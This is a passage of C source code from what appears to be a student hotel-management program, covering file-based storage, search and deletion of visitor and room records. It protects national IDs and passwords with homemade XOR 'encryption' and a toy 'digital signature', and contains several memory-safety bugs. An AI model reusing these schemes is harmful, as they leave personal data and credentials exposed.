/* function for get current date */
int data__get_current_date(int plus)
{
	time_t timep;

    struct tm *p;
    time (&timep);
    p=gmtime(&timep);

    time_t t;
    t=timep+plus*3600*24;;
    p=gmtime(&t);

    int date=(1900+p->tm_year)*10000+(1+p->tm_mon)*100+(p->tm_mday)*1;

    return date;
}


/* function for locate a peice of info in a file by key words */
int *data__seek_key_word_former(char chKey[40], FILE *fp,int * nSeek)
{
	int i,j=0;


	/* if the length of key words is less than 3, the function will not work */
	if(strlen(chKey)<2)	return NULL;

	/* get the length of the file */
	fseek(fp,0,SEEK_END); 
	int nFlen=ftell(fp);

	/* free nSeek firstly in case it has been decleared */
	free(nSeek);

	/* allocate a memary for nSeek */
	nSeek=(int *)malloc((nFlen/strlen(chKey))*sizeof(int));

	/* move the pointer to the beginning of the File */
	fseek( fp, 0, SEEK_SET );

	/* find all location where the key word exist */
	for(i=0;ftell(fp)<nFlen;)
	{
		/* match the key word */
		for(j=0;j<strlen(chKey);)
		{
			if(fgetc(fp)==(chKey[j++])) ;
			else break;
		}

		/* if found the key word, record its location */
		if(j==strlen(chKey))
		{
			nSeek[++i]=ftell(fp);
			/*active this only for debug purpose*//*printf("%d\n",nSeek[i] );*/
		}
	}

	/* record the times that the key words appeared in the File */
	nSeek[0]=i;

	return nSeek;
}


char *data__generate_random_string(int length,char *tmp)
{
	int flag, i;
	free(tmp);
	tmp=NULL;
	tmp=(char *)malloc((length+3)*sizeof(char));
	srand((unsigned)time(NULL));
	for (i = 0; i < length ; i++)
	{
		flag = rand() % 3;
		if(flag==0)
			tmp[i] = 65+ rand() % 26;
		else if(flag==1)
			tmp[i] = 97 + rand() % 26;
		else if(flag==2)
			tmp[i] = 48 + rand() % 10;
		else
			tmp[i] = 'x';
		
	}
	tmp[length]='\0';
	return tmp;
}




void data__insert_psswd_online(char *psswdKey, int usr)
{
	/* declear a file var */
    FILE *fp;
    char chPath[50];

    /* get file name */
    if(usr==1)
    sprintf(chPath,"%s/%s",DATA_FOLDER,STAFF_PASSWD_FILE);
    if(usr==2)
    sprintf(chPath,"%s/%s",DATA_FOLDER,MANAGER_PASSWD_FILE);

	if(usr==2)
    fp=fopen(chPath,"w+");

	if(usr==1)
    fp=fopen(chPath,"a+");

	
	char *tmp=NULL;

	tmp=data__generate_random_string(10+rand()%7,tmp);

	fprintf(fp,"%s",tmp );


    fprintf(fp, "%s",psswdKey );

   	tmp=data__generate_random_string(10+rand()%7,tmp);

	fprintf(fp,"%s",tmp );

    fclose(fp);

}


/* function for encoding a password */
char *data__encode_password(usr usr, char *rtrn)
{
	rtrn=(char *)malloc(sizeof(usr.name)+sizeof(usr.passwd)+3);

	char tmp[]="password";

	int j=0;
	for(int i=0;i<strlen(usr.name);i++)
	{
		
			tmp[(j++)%8]^=usr.name[i];
	}
	

	for(int i=0;i<strlen(usr.passwd);i++)
	{
			tmp[(j++)%8]^=usr.passwd[i];
	}



	for(int i=0;i<8;i++)
	{
		tmp[i]=(tmp[i]+666)%62;

		if(tmp[i]<10)	tmp[i]+=48;
		else if(tmp[i]<36) tmp[i]+=87;
		else tmp[i]=tmp[i]-36+65;
	}

	sprintf(rtrn,"%s",tmp);

	return rtrn;
}



/* function for generate a new visitor ID */
int data__generate_index_ID()
{
	/*get current timestamp*/
	time_t t;
	t = time(NULL);

 	/*utlize timestamp as visitor ID*/
	int visitor_ID = time(&t);

	return visitor_ID;
}



/*function for check if a path exist, if not exist then create one */
void data__check_file_path(char hint)
{

	char chCmd[65];

    /* create command :: file name */
   	if(hint=='v'||hint=='r'||hint=='d'||hint=='i'||hint=='V'||hint=='I'||hint=='D'||hint=='R'||hint=='g')
    sprintf(chCmd,"IF NOT EXIST \"%s\" MD \"%s\"",DATA_FOLDER,DATA_FOLDER);

	/* if data floder not exist, then make one */
	system(chCmd);

    /* if data file not exist, then make one */
	if(hint=='v'||hint=='d')
    	sprintf(chCmd,"@echo off&IF NOT EXIST \"%s\\%s\" echo VisitorData:>%s\\%s",DATA_FOLDER,VISITOR_DATA_FILE,DATA_FOLDER,VISITOR_DATA_FILE);


	if(hint=='V'||hint=='D')
		sprintf(chCmd,"@echo off&IF NOT EXIST \"%s\\%s\" echo RoomData:>%s\\%s",DATA_FOLDER,ROOM_DATA_FILE,DATA_FOLDER,ROOM_DATA_FILE);

	system(chCmd);	

}



/*function for encode data */
char *data__encode(char *str)
{
	for(int i=0;i<strlen(str);i++)
	{
		str[i]^=PASSWORD;
	}

	return str;
}

/*function for encode data */
char *data__encode_uc(char *str)
{
	int i=0;
	for(i=0;i<strlen(str);i++)
	{
		str[i]^=PASSWORD;
		str[i]=str[i]%10+48;
	}
	str[i-1]='\0';

	return str;
}




/*function of generating digital signature for data file*/
char *data__generate_digital_signature(char *tmp_signature)
{
	char signature[20];
	int fLen=0;
	char chPath[150];

   	data__check_file_path('g');

	/* declear a file var */
    FILE *fp;

    /* get file name */
    sprintf(chPath,"%s/%s",DATA_FOLDER,VISITOR_DATA_FILE);
    /* point the data file by at */
    fp = fopen (chPath, "r");

	fseek(fp,0,SEEK_END);
	fLen=ftell(fp);

	fseek(fp,0,SEEK_SET);
	signature[0]=DIGITAL_SIGNATURE_KEY;

	for(int i=0;i<fLen;i++) {signature[0]^=fgetc(fp);signature[0]+=ftell(fp);}

	fclose(fp);

    /* get file name */
    sprintf(chPath,"%s/%s",DATA_FOLDER,ROOM_DATA_FILE);
    /* point the data file by at */
    fp = fopen (chPath, "r");

	fseek(fp,0,SEEK_END);
	fLen=ftell(fp);

	fseek(fp,0,SEEK_SET);
	signature[1]=DIGITAL_SIGNATURE_KEY;

	for(int i=0;i<fLen;i++) {signature[1]^=fgetc(fp);signature[1]+=ftell(fp);}

	fclose(fp);

    /* get file name */
    sprintf(chPath,"%s/%s",DATA_FOLDER,VISITOR_DEL_FILE);
    /* point the data file by at */
    fp = fopen (chPath, "r");

	fseek(fp,0,SEEK_END);
	fLen=ftell(fp);

	fseek(fp,0,SEEK_SET);
	signature[2]=DIGITAL_SIGNATURE_KEY;

	for(int i=0;i<fLen;i++) {signature[2]^=fgetc(fp);signature[2]+=ftell(fp);}

	fclose(fp);

    /* get file name */
    sprintf(chPath,"%s/%s",DATA_FOLDER,ROOM_DEL_FILE);
    /* point the data file by at */
    fp = fopen (chPath, "r");

	fseek(fp,0,SEEK_END);
	fLen=ftell(fp);

	fseek(fp,0,SEEK_SET);
	signature[3]=DIGITAL_SIGNATURE_KEY;

	for(int i=0;i<fLen;i++) {signature[3]^=fgetc(fp);signature[3]+=ftell(fp);}

	fclose(fp);

	signature[12]='\0';

	for(int i=0;i<4;i++)
	{
		if(signature[i]<0)	signature[i]=-signature[i];
		signature[i+8]=signature[i]%7+65;
		signature[i+4]=signature[i]%10+48;
		signature[i]=signature[i]%26+97;
	}

	//free(tmp_signature);
	tmp_signature=(char *)malloc(13*sizeof(char));

	tmp_signature[0]=signature[0];
	tmp_signature[1]=signature[7];
	tmp_signature[2]=signature[10];
	tmp_signature[3]=signature[6];
	tmp_signature[4]=signature[3];
	tmp_signature[5]=signature[9];
	tmp_signature[6]=signature[2];
	tmp_signature[7]=signature[4];
	tmp_signature[8]=signature[8];
	tmp_signature[9]=signature[5];
	tmp_signature[10]=signature[11];
	tmp_signature[11]=signature[6];
	tmp_signature[12]='\0';

	fclose(fp);

	return tmp_signature;
}



/*function for update file signature */
void data__update_file_signature()
{ 
	FILE *fp;
	char chPath[50];
	char *signature=NULL;
    /* get file name */
    sprintf(chPath,"%s/%s",DATA_FOLDER,SIGNATURE_FILE);
    /* point the data file by at */
    fp = fopen (chPath, "w+");

	fprintf(fp, "%s",data__generate_digital_signature(signature) );

	fclose(fp);
}




/* function for check file signature */
void data__check_file_signature()
{
	system("cls");
	printf("Check Digital Signature...\n");
	char *current_signature=NULL;
	current_signature=data__generate_digital_signature(current_signature);

	FILE *fp;
	char chPath[50];
	/* declear the empty situation*/
	char empty[]="d7C7dCd7C7C7";
    /* get file name */
    sprintf(chPath,"%s/%s",DATA_FOLDER,SIGNATURE_FILE);
    /* point the data file read only */
    fp = fopen (chPath, "r");

    fseek(fp,0,SEEK_SET);

    for(int i=0;i<12;i++)
    {
    	if(fgetc(fp)!=current_signature[i]&&strcmp(current_signature,empty)!=0)
    	{
    		MessageBox( 0, "Cannot recognize Data file!", "Warnning!", 0 );
    		exit(-1);
    	}
    }

    fclose(fp);
}



/* function for insert a visitor data */
int data__insert_visitor_info(struct visitor *pVstr)
{
	/* reset errno */
	errno=0;

	//data__check_file_signature();

	char chPath[150];

   	data__check_file_path('v');

	/* declear a file var */
    FILE *fp;

    /* get file name */
    sprintf(chPath,"%s/%s",DATA_FOLDER,VISITOR_DATA_FILE);
    /* point the data file by at */
    fp = fopen (chPath, "at+");

    /* insert new visitor */
    sprintf( chPath,"$$$%d$|%s$|%s$|%d$|%s$|%s$|%s$|%s$|as4|||",pVstr->id=data__generate_index_ID(),pVstr->name,pVstr->tel,pVstr->vip,pVstr->nationalId,pVstr->nation,pVstr->province,pVstr->city);

    /* encode the string */
    char *chCode=data__encode(chPath);

    fprintf(fp, "%s", chCode);
    /* close file */
    fclose(fp);

    //data__update_file_signature();

    /* exclude invalid argument error */
    if(errno==22) errno=0;

    /* return error num */
	return errno;
}



/* function for insert a room data */
int data__insert_room_info(struct room *pRm)
{
	/* reset errno */
	errno=0;

	//data__check_file_signature();

	char chPath[150];

   	data__check_file_path('V');

	/* declear a file var */
    FILE *fp;

    /* get file name */
    sprintf(chPath,"%s/%s",DATA_FOLDER,ROOM_DATA_FILE);
    /* point the data file by at */
    fp = fopen (chPath, "at+");

    /* transform visitorId to string */
    char tmp_visitorId[12*(VISITOR_MAX_NUMBER+1)];
    tmp_visitorId[0]='\0';
    char tmp_str[12];

    for(int i=1;i<=pRm->visitorId[0];i++)
    {
    	sprintf(tmp_str,"%d",pRm->visitorId[i]);
    	strcat(tmp_visitorId,tmp_str);
    }
    /* if no visitorId, put 0 in string*/
    if(pRm->visitorId[0]==0)	sprintf(tmp_visitorId,"%d",0);

    /* insert new visitor */
    sprintf( chPath,"$$$%dI$|%dR$|%dD$|%sV$|%dT$|%fP$|%dC$|%dc$|hhhH$|as4|||",pRm->index=data__generate_index_ID(),pRm->roomId,pRm->date,tmp_visitorId,pRm->type,pRm->price,pRm->checkIn,pRm->checkOut);

    /* encode the string */
    char *chCode=data__encode(chPath);

    fprintf(fp, "%s", chCode);
    /* close file */
    fclose(fp);

   // data__update_file_signature();

    /* exclude invalid argument error */
    if(errno==22) errno=0;

    /* return error num */
	return errno;
}



/* function for locate a peice of info in a file by key words */
int *data__seek_key_word(char chKey[40], FILE *fp,int * nSeek,int file)
{
	int i,j=0;
	FILE *indx=NULL;
	char chTmp[10],chPath[50];


	sprintf(chKey,"%ss",chKey);
	/* if the length of key words is less than 3, the function will not work */
	if(strlen(chKey)<2)	return NULL;

	if(file==1)
    	sprintf(chPath,"%s/%s",DATA_FOLDER,VISITOR_INDEX_FILE);
		
	if(file==2)
		sprintf(chPath,"%s/%s",DATA_FOLDER,ROOM_INDEX_FILE);

	indx=fopen(chPath,"r");

	/* get the length of the file */
	fseek(fp,0,SEEK_END); 
	int nFlen=ftell(fp);
	fseek(indx,0,SEEK_END); 
	int nIlen=ftell(indx);

	/* free nSeek firstly in case it has been decleared */
	free(nSeek);

	/* allocate a memary for nSeek */
	nSeek=(int *)malloc((nFlen/strlen(chKey))*sizeof(int));
	nSeek[0]=0;


	/* move the pointer to the beginning of the File */
	fseek( indx, 0, SEEK_SET );

	/* find all location where the key word exist */
	for(i=0;ftell(indx)<nIlen;)
	{
		/* match the key word */
		for(j=0;j<strlen(chKey);)
		{
			if(fgetc(indx)==(chKey[j++]^PASSWORD)) ;
			else break;
		}

		/* if found the key word, record its index location */
		if(j==strlen(chKey))
		{
			int k=0;
			do
			{
				chTmp[k++]=fgetc(indx);

			}while(chTmp[k-1]!='$');

			chTmp[k-1]='\0';

			if(atoi(chTmp)!=0)
			nSeek[++i]=atoi(chTmp);
		}
	}


	fclose(indx);

	indx=fopen(chPath,"a+");

	/* move the pointer to the beginning of the File */
	fseek( fp, nSeek[i], SEEK_SET );

	/* find all location where the key word exist */
	for(;ftell(fp)<nFlen;)
	{
		/* match the key word */
		for(j=0;j<strlen(chKey);)
		{
			if(fgetc(fp)==(chKey[j++]^PASSWORD)) ;
			else break;
		}

		/* if found the key word, record its location */
		if(j==strlen(chKey))
		{
			nSeek[++i]=ftell(fp);
			/*active this only for debug purpose*//*printf("%d\n",nSeek[i] );*/
			int k=0;
			for( k=0;k<strlen(chKey)-1;k++)
			{
				chTmp[k]=chKey[k]^PASSWORD;
			}
			chTmp[k]='\0';
			fprintf(indx, "%s$%d$",chTmp,nSeek[i] );
		}
	}

	/* record the times that the key words appeared in the File */
	nSeek[0]=i;

	fclose(indx);

	return nSeek;
}



/* function for get one visitor info */
void data__get_one_visitor_info(int nSeek,FILE *fp,visitor *visitor,int index)
{

	int i,nItem,nLineCnt,nLineCnt_sub=0;
	char chTmp[35];


	/* get the length of the File */
	fseek(fp,0,SEEK_END); 
	int nFlen=ftell(fp);

	/* set the pointer at the nSeek point of the File */
	fseek(fp,nSeek,SEEK_SET); 

	/* find the beginning of this visitor info */
	do
	{
		fseek(fp,-4,SEEK_CUR); 

	}while(!((fgetc(fp)^PASSWORD)=='$'&&(fgetc(fp)^PASSWORD)=='$'&&(fgetc(fp)^PASSWORD)=='$'));

	/* adjust the pionter for the following reading*/
	fseek(fp,2,SEEK_CUR); 
	/* read visitor info */
	nItem=0;
	do
	{
		/* only active this for debug purpose */
		/*printf("%c", (fgetc(fp)^PASSWORD));*/
		chTmp[0]='\0';
		i=0;
		/* read visitor info item one by one */
		do
		{
			fseek(fp,-2,SEEK_CUR); /* readjust the pointer*/

			chTmp[i++]=(fgetc(fp)^PASSWORD);

			/* mark when find a '$|' which indicate the end of one item */ 
			nLineCnt_sub=0;
			if((fgetc(fp)^PASSWORD)=='$')	nLineCnt_sub++;
			if((fgetc(fp)^PASSWORD)=='|')	nLineCnt_sub++;

			fseek(fp,-2,SEEK_CUR); /* readjust the pointer */

			/* mark when find a '|||' which indicate the end this user info */ 
			nLineCnt=0;
			if((fgetc(fp)^PASSWORD)=='|')	nLineCnt++;
			if((fgetc(fp)^PASSWORD)=='|')	nLineCnt++;
			if((fgetc(fp)^PASSWORD)=='|')	nLineCnt++;
			fseek(fp,-1,SEEK_CUR); 

		}while(nLineCnt_sub<2&&ftell(fp)<nFlen&&nLineCnt<3);

		/* give chTmp a end mark */
		chTmp[i]='\0';

		if(nLineCnt_sub==2)
		{
			/* load these visitor info to struct pointer */
			if(nItem==0)	(visitor+index)->id=atoi(chTmp);
			if(nItem==1)	strcpy((visitor+index)->name,chTmp);
			if(nItem==2)	strcpy((visitor+index)->tel,chTmp);
			if(nItem==3)	(visitor+index)->vip=atoi(chTmp);
			if(nItem==4)	strcpy((visitor+index)->nationalId,chTmp);
			if(nItem==5)	strcpy((visitor+index)->nation,chTmp);
			if(nItem==6)	strcpy((visitor+index)->province,chTmp);
			if(nItem==7)	strcpy((visitor+index)->city,chTmp);

			/* only active this for debug purpose */
			/*printf("%s\n",chTmp);*/
		}
		/* when come accross '|||' break */
		if(nLineCnt==3||ftell(fp)>nFlen) break;

		fseek(fp,2,SEEK_CUR); 
		nItem++;

	}while(1);

}



/* function for get one room info */
void data__get_one_room_info(int nSeek,FILE *fp,room *pRoom,int index)
{

	int i,nItem,nLineCnt,nLineCnt_sub=0;
	char chTmp[35];

	/* get the length of the File */
	fseek(fp,0,SEEK_END); 
	int nFlen=ftell(fp);

	/* set the pointer at the nSeek point of the File */
	fseek(fp,nSeek,SEEK_SET); 

	/* find the beginning of this visitor info */
	do
	{
		fseek(fp,-4,SEEK_CUR); 

	}while(!((fgetc(fp)^PASSWORD)=='$'&&(fgetc(fp)^PASSWORD)=='$'&&(fgetc(fp)^PASSWORD)=='$'));

	/* adjust the pionter for the following reading*/
	fseek(fp,2,SEEK_CUR); 
	/* read visitor info */
	nItem=0;
	do
	{
		/* only active this for debug purpose */
		/*printf("%c", (fgetc(fp)^PASSWORD));*/
		chTmp[0]='\0';
		i=0;
		/* read visitor info item one by one */
		do
		{
			fseek(fp,-2,SEEK_CUR); /* readjust the pointer*/

			chTmp[i++]=(fgetc(fp)^PASSWORD);

			/* mark when find a '$|' which indicate the end of one item */ 
			nLineCnt_sub=0;
			if((fgetc(fp)^PASSWORD)=='$')	nLineCnt_sub++;
			if((fgetc(fp)^PASSWORD)=='|')	nLineCnt_sub++;

			fseek(fp,-2,SEEK_CUR); /* readjust the pointer */

			/* mark when find a '|||' which indicate the end this user info */ 
			nLineCnt=0;
			if((fgetc(fp)^PASSWORD)=='|')	nLineCnt++;
			if((fgetc(fp)^PASSWORD)=='|')	nLineCnt++;
			if((fgetc(fp)^PASSWORD)=='|')	nLineCnt++;
			fseek(fp,-1,SEEK_CUR); 

		}while(nLineCnt_sub<2&&ftell(fp)<nFlen&&nLineCnt<3);

		/* give chTmp a end mark */
		chTmp[i-1]='\0';

		if(nLineCnt_sub==2)
		{
			/* load these visitor info to struct pointer */
			if(nItem==0)	(pRoom+index)->index=atoi(chTmp);
			if(nItem==1)	(pRoom+index)->roomId=atoi(chTmp);
			if(nItem==2)	(pRoom+index)->date=atoi(chTmp);

			if(nItem==3)
			{
				char tmp_chTmp[13];
				int j=0;
				int k=0;

				for(k=0;k<(strlen(chTmp)/10);k++)
				{
					for(j=0;j<10;j++)
					{
						tmp_chTmp[j]=chTmp[j+k*10];
					}
					tmp_chTmp[j]='\0';

					(pRoom+index)->visitorId[k+1]=atoi(tmp_chTmp);
				}

				(pRoom+index)->visitorId[0]=k;
			}	

			if(nItem==4)	(pRoom+index)->type=atoi(chTmp);
			if(nItem==5)	(pRoom+index)->price=atof(chTmp);
			if(nItem==6)	(pRoom+index)->checkIn=atoi(chTmp);
			if(nItem==7)	(pRoom+index)->checkOut=atoi(chTmp);

			/* only active this for debug purpose */
			/*printf("%s\n",chTmp);*/
		}
		/* when come accross '|||' break */
		if(nLineCnt==3||ftell(fp)>nFlen) break;

		fseek(fp,2,SEEK_CUR); 
		nItem++;

	}while(1);

}



/* function for collect info about deleted visitor id */
int *data__get_del_usr_info(int *deled_usr)
{
	/* reset errno */
	errno=0;

	char chPath[60];

	data__check_file_path('r');
  
  	/* this function should not have worked well with out this code, however...*/
	/*if(deled_usr!=NULL) free(deled_usr);*/
	/* declear a file var */
    FILE *fp;

    /* get file name */
    sprintf(chPath,"%s/%s",DATA_FOLDER,VISITOR_DEL_FILE);
    /* point the data file by at */
    fp = fopen (chPath, "r");

    /* get the length of the file */
    fseek(fp,0,SEEK_END); 
	int nFlen=ftell(fp);

	/* allocate a memory for int[] deled_usr*/
	deled_usr=(int *)malloc((nFlen/10+1)*sizeof(int));

	/* move pointer to the beginning of the File */
    fseek(fp,0,SEEK_SET);

    char strTmp[12];
    int j=0;
    int i=0;

    /* give the number of deleted visitors to int[] */
    *deled_usr=nFlen/10+1;

    /* find each deleted visitor ID */
    for(j++;j<nFlen/10+1;j++)
    {
    	/* get one ID */
    	for(i=0;i<10;i++)
   	 	{
    		strTmp[i]=(fgetc(fp)^PASSWORD);
    	}
    	strTmp[i]='\0';

    	/* assign the ID to int[]*/
    	*(deled_usr+j)=atoi(strTmp);
    }
    /*close the File */
    fclose(fp);

    /* return the int[]*/
    return deled_usr;
}



/* function for collect info about deleted visitor id */
double *data__get_del_room_info(double *deled_rom)
{
	/* reset errno */
	errno=0;

	char chPath[60];

	data__check_file_path('R');
  
  	/* this function should not have worked well with out this code, however...*/
	/*if(deled_rom!=NULL) free(deled_usr);*/
	/* declear a file var */
    FILE *fp;

    /* get file name */
    sprintf(chPath,"%s/%s",DATA_FOLDER,ROOM_DEL_FILE);
    /* point the data file by at */
    fp = fopen (chPath, "r");

    /* get the length of the file */
    fseek(fp,0,SEEK_END); 
	int nFlen=ftell(fp);

	/* allocate a memory for int[] deled_usr*/
	deled_rom=(double *)malloc((nFlen/13+1)*sizeof(double));

	/* move pointer to the beginning of the File */
    fseek(fp,0,SEEK_SET);

    char strTmp[12];
    int j=0;
    int i=0;

    /* give the number of deleted visitors to int[] */
    *deled_rom=nFlen/14+1;

    /* find each deleted visitor ID */
    for(j++;j<nFlen/14+1;j++)
    {
    	/* get one ID */
    	for(i=0;i<14;i++)
    		strTmp[i]=(fgetc(fp)^PASSWORD);
    	
    	strTmp[i]='\0';

    	/* assign the ID to int[]*/
    	*(deled_rom+j)=(double)atof(strTmp);
    }
    /*close the File */
    fclose(fp);

    /* return the int[]*/
    return deled_rom;
}



/* function for get visitors info */
struct visitor *data__get_visitor_info(char value[35],visitor *pVstr)
{
	/* reset errno */
	errno=0;

	//data__check_file_signature();

	char chPath[60];

	data__check_file_path('d');

	/* declear a file var */
    FILE *fp;

    /* get file name */
    sprintf(chPath,"%s/%s",DATA_FOLDER,VISITOR_DATA_FILE);
    /* point the data file by at */
    fp = fopen (chPath, "r");

	int *a=NULL;

	if(value[0]=='\0') sprintf(value,"$$");

	/* find visitor info position in File by key words */
	a=data__seek_key_word(value, fp,a,1);

	/* if no visitor found */
	if(!a||!a[0]){errno=0;g_nRtrnRows=0;return NULL;}

	/* free the memmory of former pVstr */
	free(pVstr);

	/* set a visitor struct array */
	struct visitor visitors[a[0]+4];

	/* point pVstr at visitors */
	pVstr=visitors;

	/* allocate memory for pVstr */
	pVstr=(visitor*)malloc(a[0]*sizeof(visitor));

	/* find all visitor ID which is abandon */
	int *del=NULL;
	del=data__get_del_usr_info(del);

	int ifDel=0;
	int ii=0;

	/* convert exist visitor info to struct one by one*/
	for(int i=0;i<a[0];i++,ii++)
	{
		ifDel=0;

		data__get_one_visitor_info(a[i+1],fp,pVstr,ii);

		/* exclude deleted visitor ID */
		for(int j=0;j<*del;j++)
		{
			if((pVstr+ii)->id==*(del+j+1)) ifDel=1;
		}

		if(ifDel==1)	ii--;
	}

	/* close file */
    fclose(fp);

    //data__update_file_signature();

	/* inform return rows of the pVstr*/
	g_nRtrnRows=ii;

	if(errno==22)	errno=0;

   	return pVstr;
}



/* function for get room info */
struct room *data__get_room_info(int index, int roomId, int date, int visitorId[], int type, double price, int checkIn, int checkOut,room *pRm)
{
	/* reset errno */
	errno=0;

	//data__check_file_signature();

	char chPath[60];
	char value[35];

	while(1)
	{
		if(index!=0)
		{
			sprintf(value,"%dI$",index);
			break;
		}

		if(roomId!=0)
		{
			sprintf(value,"%dR$",roomId);
			break;
		}

		if(date!=0)
		{
			sprintf(value,"%dD$",date);
			break;
		}

		if(visitorId!=NULL)
		{
			char tmp_ch[13];
			value[0]='\0';

			for(int i=0;i<visitorId[0];i++)
			{
				itoa(visitorId[i+1],tmp_ch,10);
				strcat(value,tmp_ch);
			}
			sprintf(tmp_ch,"V$");
			strcat(value,tmp_ch);
			break;
		}

		if(type!=0)
		{
			sprintf(value,"%dT$",type);
			break;
		}

		if(price!=0)
		{
			sprintf(value,"%lfP$",price);
			break;
		}

		if(checkIn!=0)
		{
			sprintf(value,"%dC$",checkIn);
			break;
		}

		if(checkOut!=0)
		{
			sprintf(value,"%dc$",checkOut);
			break;
		}

		sprintf(value,"hhhH$");
		break;
		
	}


	data__check_file_path('D');

	/* declear a file var */
    FILE *fp;

    /* get file name */
    sprintf(chPath,"%s/%s",DATA_FOLDER,ROOM_DATA_FILE);
    /* point the data file by at */
    fp = fopen (chPath, "r");

	int *a=NULL;

	/* find room info position in File by key words */
	a=data__seek_key_word(value, fp,a,2);

	/* if no room found */
	if(!a){errno=0;	g_nRtrnRows=0; return NULL;}

	/* free the memmory of former pVstr */
	free(pRm);

	/* set a visitor struct array */
	struct room rooms[a[0]+4];

	/* point pVstr at visitors */
	pRm=rooms;

	/* allocate memory for pVstr */
	pRm=(room*)malloc(a[0]*sizeof(room));

	/* find all visitor ID which is abandon */
	double *del=NULL;
	del=data__get_del_room_info(del);

	int ifDel=0;
	int ii=0;

	/* convert exist visitor info to struct one by one*/
	for(int i=0;i<a[0];i++,ii++)
	{
		ifDel=0;

		data__get_one_room_info(a[i+1],fp,pRm,ii);

		/* exclude deleted visitor ID */
		for(int j=0;j<*del;j++)
		{
			/* only active this for debug purpose*//*printf("%d\n", (int)((*(del+j+1)-(double)(int)*(del+j+1))*1000));*/

			if(((pRm+ii)->index==(int)*(del+j+1))&&((pRm+ii)->roomId==((int)((*(del+j+1)-(double)(int)*(del+j+1))*1000)))) ifDel=1;
		}


		for(int jj=0;jj<ii&&ifDel==0;jj++)
		{
			if((pRm+jj)->date==(pRm+ii)->date&&(pRm+jj)->roomId==(pRm+ii)->roomId)
			{
				*(pRm+jj)=*(pRm+ii);
				ifDel=1;
			}
		}


		if(ifDel!=0)	ii--;
	}

	g_nRtrnRows=ii;
	ii=0;

	for(;ii<g_nRtrnRows;ii++)
	{

		ifDel=0;
		if(ifDel==0&&index!=0&&(pRm+ii)->index!=index) ifDel=1;
		if(ifDel==0&&roomId!=0&&(pRm+ii)->roomId!=roomId) ifDel=1;
		if(ifDel==0&&date!=0&&(pRm+ii)->date!=date) ifDel=1;

		if(ifDel==0&&visitorId!=NULL)
		{
			if(visitorId[0]==0)
			{	
				if((pRm+ii)->visitorId[0]!=0) ifDel=1;
			}
			else
			{
				ifDel=visitorId[0];
				for(int k=0;k<visitorId[0];k++)
				{
					for(int l=0;l<(pRm+ii)->visitorId[0];l++)
					{
						if(visitorId[k+1]==(pRm+ii)->visitorId[l+1]) ifDel--;
					}
				}
			}
		}

		if(type!=0&&(pRm+ii)->type!=type) ifDel=1;
		if(ifDel==0&&price!=0&&(pRm+ii)->price!=price) ifDel=1;
		if(ifDel==0&&checkIn!=0&&(pRm+ii)->checkIn!=checkIn) ifDel=1;
		if(ifDel==0&&checkOut!=0&&(pRm+ii)->checkOut!=checkOut) ifDel=1;

		if(ifDel!=0)	
		{
			for(int iiii=ii+1;iiii<g_nRtrnRows;iiii++)
			{
				*(pRm+ii)=*(pRm+iiii);
			}

			ii--;
			g_nRtrnRows--;
		}


	}

	/* close file */
    fclose(fp);

    //data__update_file_signature();

	/* inform return rows of the pVstr*/
	g_nRtrnRows=ii;

	if(errno==22)	errno=0;

   	return pRm;
}


/* function for delete a visitor info */
int data__del_visitor_info(int id)
{
	/* reset errno */
	errno=0;

	//data__check_file_signature();

	/*check if the ID legal */
	if(id>1543399229&&id<10000000000)
	{
		char chPath[30];

		data__check_file_path('i');

		/* declear a file var */
    	FILE *fp;

   	 	/* get file name */
   	 	sprintf(chPath,"%s/%s",DATA_FOLDER,VISITOR_DEL_FILE);
    	/* point the data file by at */
    	fp = fopen (chPath, "at+");

    	/* allocate tmp str with memory */
    	char *tmp_str=NULL;
    	tmp_str=(char*)malloc(13*sizeof(char));


    	/* insert new visitor to del list */
    	sprintf( tmp_str,"%d",id);

    	/* encode data */
    	tmp_str=data__encode(tmp_str);

    	/* output data to file */
    	fprintf(fp, "%s",tmp_str );

    	/* close file */
    	fclose(fp);

    	//data__update_file_signature();

    	return 0;
	}


	/* remark error */
	errno=2;
	if(errno==22)	errno=0;
	return 2;
}



/* function for delete a room info */
int data__del_room_info(int id,int room)
{
	/* reset errno */
	errno=0;

	//data__check_file_signature();

	/*check if the ID legal */
	if(id>1543399229&&id<10000000000)
	{
		char chPath[30];

		data__check_file_path('I');

		/* declear a file var */
    	FILE *fp;

   	 	/* get file name */
   	 	sprintf(chPath,"%s/%s",DATA_FOLDER,ROOM_DEL_FILE);
    	/* point the data file by at */
    	fp = fopen (chPath, "at+");

    	/* allocate tmp str with memory */
    	char *tmp_str=NULL;
    	tmp_str=(char*)malloc(20*sizeof(char));


    	/* insert new room to del list */
    	sprintf( tmp_str,"%d.%d",id,room);

    	/* encode data */
    	tmp_str=data__encode(tmp_str);

    	/* output data to file */
    	fprintf(fp, "%s",tmp_str );

    	/* close file */
    	fclose(fp);

    	//data__update_file_signature();

    	return 0;
	}
	/* remark error */
	errno=2;
	if(errno==22)	errno=0;
	return 2;
}




/* function for copy a date rooms moudle by date  */
int data__room_setup_by_date(int date,int modelDate)
{
	
	/* declear a room pointer to receive the matched rooms info */
	struct room *pRm=NULL;

	pRm= data__get_room_info(0/*index*/,0/*roomId*/,modelDate/*date*/,NULL,0/*type*/,0/*price*/,0/*checkIn*/,0/*checkOut*/,pRm);

	/* show error hint if the function not runing successfully */
	if(!pRm)	printf("Error in Function data__get_room_info: %s\n",strerror(errno));

	for(int i=0;i<g_nRtrnRows;i++)
	{
		(pRm+i)->date=date;
		(pRm+i)->checkIn=1;
		(pRm+i)->checkOut=1;
		(pRm+i)->visitorId[0]=0;

		data__insert_room_info(pRm+i);
	}

	return 0;
}

int data__room_setup_by_nothing(int date)
{
	/* Create a new visitor struct variable with some user info */
	room NewRoom={0/*this is the visitor id, please leave 0 here */,0/*roomId*/,date/*date*/,{0}/*visitorId*/,5/*room type*/,66.66/*price*/,1/*checkIn*/,1/*checkOut*/};

	for(int i=0;i<80;i++)
	{
		NewRoom.roomId=(i/10+1)*100+i%10+1;
		data__insert_room_info(&NewRoom);
	}
	
	return 0;
}

void data__start_monitor(char *path)
{
	/* declear a file var */
    FILE *fp;

    /* point the data file by user name */
    fp = fopen ("lstn.bat", "w+");

    char *tmp=NULL;
	tmp=strrchr(path, '\\');
	for(int i=0;i<strlen(tmp);i++)
		tmp[i]=tmp[i+1];
	time_t t;
	t = time(NULL);

	char *tm=(char *)malloc(15*sizeof(char));

	itoa(time(&t),tm,10);

